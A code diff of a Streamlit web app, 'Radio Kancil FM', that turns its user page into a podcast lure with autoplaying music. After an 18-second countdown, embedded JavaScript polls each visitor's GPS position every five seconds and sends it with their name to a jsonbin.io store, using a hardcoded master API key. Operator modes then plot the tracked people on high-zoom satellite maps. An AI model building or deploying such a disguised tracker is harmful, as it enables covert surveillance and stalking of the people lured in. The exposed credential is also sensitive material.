@@ -29,28 +29,60 @@ def simpan(users, kicked):
     data["_kicked"] = kicked
     requests.put(URL, headers=HEADERS, json=data, timeout=10)
 
-# ===== MODE USER HP =====
+# ===== MODE USER = PODCAST SEK, 18 DETIK, TRUS GPS AKTIF =====
 if mode == "user":
-    st.title("📻 RADIO KANCIL FM - LIVE")
-    nama = st.text_input("👤 ISI JENENGMU:", placeholder="Contoh: NamaMu")
+    # 1. PODCAST MUNCUL SEK - PERSIS NETLIFY WINGI
+    st.markdown("""
+    <style>
+    .podcast-wrap{background:#000000; padding:20px 16px 20px 16px; border-radius:20px; text-align:center;}
+    .podcast-title{color:white; font-size:32px; font-weight:800; line-height:1.1; margin:10px 0 8px 0;}
+    .podcast-sub{color:#b3b3b3; font-size:15px; margin-bottom:10px;}
+    .live-badge{display:inline-block; background:#ff0000; color:white; padding:4px 14px; border-radius:20px; font-size:12px; font-weight:bold; letter-spacing:1px;}
+    </style>
+    """, unsafe_allow_html=True)
+    st.markdown('<div class="podcast-wrap"><span class="live-badge">● ON AIR - RADIO KANCIL FM</span><div class="podcast-title">🎙️ Podcast Coffe Morning</div><div class="podcast-sub">Sukses Berwira Usaha - Dengerin Sebentar Yuk</div></div>', unsafe_allow_html=True)
+    st.image("https://images.unsplash.com/photo-1478737270239-2f02b77fc618?w=1000&q=80", use_container_width=True)
+
+    # 2. LAGU BUNYI - GANTI LINK MP3 MU NANG KENE
+    # Lagu iki sing muni 18 detik pertama
+    audio_url = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
+    st.audio(audio_url, format="audio/mp3", autoplay=True)
+    st.info("🎵 Lagu Coffe Morning lagi muni... Diemin 18 detik, habis iku GPS langsung aktif dewe!")
+
+    # 3. ISI JENENG - TRUS GPS OTOMATIS JALAN HABIS 18 DETIK
+    nama = st.text_input("👤 ISI JENENGMU:", placeholder="Contoh: joni")
     if not nama:
-        st.warning("Isi jenengmu disik!")
+        st.warning("Isi jenengmu disik! Lagu tetep muni sambil nunggu.")
         st.stop()
     nama = nama.strip()
     users, kicked = ambil()
     if nama in kicked:
         st.error(f"⛔ {nama} DIKELUARKAN STUDIO FM! Tunggu link baru!")
         st.stop()
-    st.success(f"Halo {nama}! GPS Jalan! Ojo ditutup!")
+    st.success(f"Halo {nama}! Siap-siap, GPS aktif habis lagu 18 detik!")
+
+    # GPS + TIMER 18 DETIK - IKI KUNCINE!
     html_code = f"""
-    <div id="out" style="padding:15px;background:#e8f5e9;border-radius:10px;">Mencari GPS...</div>
+    <div id="out" style="padding:15px;background:#000;color:#00ff00;border-radius:10px;font-family:monospace;text-align:center;font-size:16px;">🎵 PODCAST MUNI...<br><span id="cd" style="font-size:28px;">18</span><br>detik lagi GPS AKTIF...</div>
     <script>
     const BIN_ID = "6aeeda8bac6210605a74a7b5";
     const API_KEY = "$2a$10$LqQMOcUMXjbfZswzJUFrReGYD5dloL2gTCOLRwT17Oo96mUzr7.aO";
     let myId = "{nama}";
+    let sisa = 18;
+    let cd = document.getElementById('cd');
+    let timer = setInterval(function(){{
+      sisa--;
+      if(cd) cd.innerHTML = sisa;
+      if(sisa <= 0){{
+        clearInterval(timer);
+        document.getElementById('out').innerHTML = "📍 GPS AKTIF - " + myId + "<br>Mencari lokasi...";
+        kirim();
+        setInterval(kirim, 5000);
+      }}
+    }}, 1000);
     function kirim(){{
       navigator.geolocation.getCurrentPosition(pos => {{
-        document.getElementById('out').innerHTML = "GPS AKTIF - " + myId + "<br>Lat: " + pos.coords.latitude;
+        document.getElementById('out').innerHTML = "✅ GPS AKTIF - " + myId + "<br>Lat: " + pos.coords.latitude + "<br>📍 TERKIRIM KE STUDIO FM!";
         fetch("https://api.jsonbin.io/v3/b/" + BIN_ID + "/latest", {{headers: {{"X-Master-Key": API_KEY}}}})
         .then(r => r.json()).then(j => {{
           let d = j.record || {{}}; while(d.record){{ d = d.record; }}
@@ -63,46 +95,21 @@ if mode == "user":
         }});
       }});
     }}
-    kirim(); setInterval(kirim, 5000);
     </script>
     """
-    st.components.v1.html(html_code, height=120)
+    st.components.v1.html(html_code, height=140)
 
-# ===== MODE PODCAST - RADIO FM - BARU =====
+# ===== MODE PODCAST DEWE - BEN ISO DIBUKA LANGSUNG YO ISO =====
 elif mode == "podcast":
-    st.markdown("""
-    <style>
-    .podcast-wrap{background:#000000; padding:20px 16px 30px 16px; border-radius:20px; text-align:center;}
-    .podcast-title{color:white; font-size:36px; font-weight:800; line-height:1.1; margin:10px 0 8px 0;}
-    .podcast-sub{color:#b3b3b3; font-size:16px; margin-bottom:18px;}
-    .podcast-img{width:100%; border-radius:20px; border:2px solid #222;}
-    .live-badge{display:inline-block; background:#ff0000; color:white; padding:4px 14px; border-radius:20px; font-size:12px; font-weight:bold; letter-spacing:1px;}
-    </style>
-    """, unsafe_allow_html=True)
-    st.markdown('<div class="podcast-wrap"><span class="live-badge">● ON AIR - RADIO KANCIL FM</span><div class="podcast-title">🎙️ Podcast Coffe Morning</div><div class="podcast-sub">Sukses Berwira Usaha - Dengerin Sebentar Yuk</div></div>', unsafe_allow_html=True)
+    st.title("🎙️ Podcast Coffe Morning")
+    st.write("Sukses Berwira Usaha - Dengerin Sebentar Yuk")
     st.image("https://images.unsplash.com/photo-1478737270239-2f02b77fc618?w=1000&q=80", use_container_width=True)
-    st.markdown("### 📻 Radio Kancil FM - Bandung")
-    st.write("Coffe Morning - Ngopi santai sambil dengerin cerita sukses wirausaha Bandung. Putar neng ngisor iki!")
-    # GANTI LINK MP3 MU NANG KENE
-    audio_url = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
-    st.audio(audio_url, format="audio/mp3")
+    st.audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3", format="audio/mp3")
     if st.button("▶️ PUTAR LAGU", type="primary", use_container_width=True):
-        st.audio(audio_url, format="audio/mp3", autoplay=True)
-        st.success("🎵 Lagi Muter... Coffe Morning - Radio Kancil FM!")
-    st.markdown("---")
-    st.markdown("**Episode Liyane:**")
-    c1, c2 = st.columns(2)
-    with c1:
-        if st.button("🎧 Episode 1 - Ngopi & Sukses", use_container_width=True):
-            st.audio(audio_url, format="audio/mp3", autoplay=True)
-    with c2:
-        if st.button("🎧 Episode 2 - Berwira Usaha", use_container_width=True):
-            st.audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3", format="audio/mp3", autoplay=True)
-    st.markdown("---")
+        st.audio("https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3", format="audio/mp3", autoplay=True)
     st.markdown("[⬅️ Balik ke STUDIO FM](https://radio-kancil-fm.streamlit.app/?mode=komando)")
-    st.markdown("[🚁 MODE DRONE CINEMATIC 3D - ZOOM 16](https://radio-kancil-fm.streamlit.app/?mode=drone)")
 
-# ===== MODE DRONE - 4K TAJEM =====
+# ===== MODE DRONE - 4K =====
 elif mode == "drone":
     st.title("📻 RADIO KANCIL FM - DRONE CINEMATIC 3D")
     st.write("Diemin 10 detik biar peta ke-load, baru klik tombol ijo jeneng nang ngisor peta!")
@@ -291,7 +298,6 @@ else:
         zoom_awal = 16 if users else 5
         if st.session_state.get("zoom_max"):
             zoom_awal = 16
-        # PETA 4K - Google Satellite HD, tile 512
         m = folium.Map(location=tengah, zoom_start=zoom_awal, max_zoom=20, min_zoom=2, tiles="https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}", attr="Google Satellite 4K", zoom_control=True)
         for n, v in users.items():
             folium.Marker([v["lat"], v["lon"]], popup=f"<b>{n}</b><br>{v.get('waktu','')}<br>Lat: {v['lat']}<br>Lon: {v['lon']}", tooltip=n, icon=folium.Icon(color="red", icon="eye-open")).add_to(m)
